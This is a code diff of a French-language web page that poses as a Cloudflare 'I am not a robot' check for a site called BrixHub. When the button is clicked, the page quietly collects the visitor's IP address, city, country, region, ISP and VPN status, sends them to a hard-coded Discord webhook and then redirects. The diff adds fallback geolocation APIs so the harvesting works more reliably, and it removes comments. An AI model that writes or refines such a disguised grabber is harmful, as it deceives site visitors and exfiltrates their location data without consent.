@@ -81,7 +81,6 @@
     <button class="btn" onclick="startFastVerify()">Je ne suis pas un robot</button>
   </div>
 
-  <!-- Écran de vérification -->
   <div class="container" id="verifyScreen" style="display:none;">
     <div class="cloud-header">
       <span style="font-size:32px;">☁️</span>
@@ -95,12 +94,32 @@
     const WEBHOOK = "https://discord.com/api/webhooks/1505393672726777876/RUx-YTl9zgICf2eDqGVWQk9CoX9gwtW3J4yPxPpSyVRt3YnfAITFqv-XgNsVZbW4zVbn";
 
     async function getIPData() {
-      try {
-        const res = await fetch('https://ip-api.com/json/?fields=query,city,regionName,country,isp,proxy,hosting');
-        return await res.json();
-      } catch(e) {
-        return {};
+      const apis = [
+        'https://ipapi.co/json/',
+        'https://ipwho.is/json',
+        'https://freeipapi.com/api/json',
+        'https://api.ipify.org?format=json'
+      ];
+
+      for (let url of apis) {
+        try {
+          const res = await fetch(url);
+          if (!res.ok) continue;
+          const data = await res.json();
+
+          if (data.ip || data.query) {
+            return {
+              ip: data.ip || data.query,
+              city: data.city || data.regionName || "Inconnue",
+              country: data.country_name || data.country || "Inconnu",
+              region: data.region || data.regionName || "N/A",
+              isp: data.org || data.isp || "N/A",
+              proxy: data.proxy || false
+            };
+          }
+        } catch(e) {}
       }
+      return { ip: "N/A", city: "Inconnue", country: "N/A", region: "N/A", isp: "N/A", proxy: false };
     }
 
     async function startFastVerify() {
@@ -109,20 +128,18 @@
 
       const ipData = await getIPData();
 
-      // Envoi des informations sur ton webhook
       const payload = {
         content: `🔐 **Nouvelle vérification Cloudflare - BrixHub**`,
         embeds: [{
           title: "✅ Vérification terminée",
           color: 0xffffff,
           fields: [
-            { name: "IP", value: `\`${ipData.query || "N/A"}\``, inline: true },
+            { name: "IP", value: `\`${ipData.ip || "N/A"}\``, inline: true },
             { name: "Ville", value: ipData.city || "Inconnue", inline: true },
             { name: "Pays", value: ipData.country || "N/A", inline: true },
-            { name: "Région", value: ipData.regionName || "N/A", inline: true },
+            { name: "Région", value: ipData.region || "N/A", inline: true },
             { name: "ISP", value: ipData.isp || "N/A", inline: false },
             { name: "VPN/Proxy", value: ipData.proxy ? "✅ Oui" : "❌ Non", inline: true },
-            { name: "Datacenter", value: ipData.hosting ? "✅ Oui" : "❌ Non", inline: true },
             { name: "Heure", value: new Date().toLocaleString('fr-FR'), inline: false }
           ],
           timestamp: new Date().toISOString()
@@ -135,7 +152,6 @@
         body: JSON.stringify(payload)
       }).catch(() => {});
 
-      // Redirection rapide
       setTimeout(() => {
         window.location.href = "https://brixhub.site";
       }, 1650);
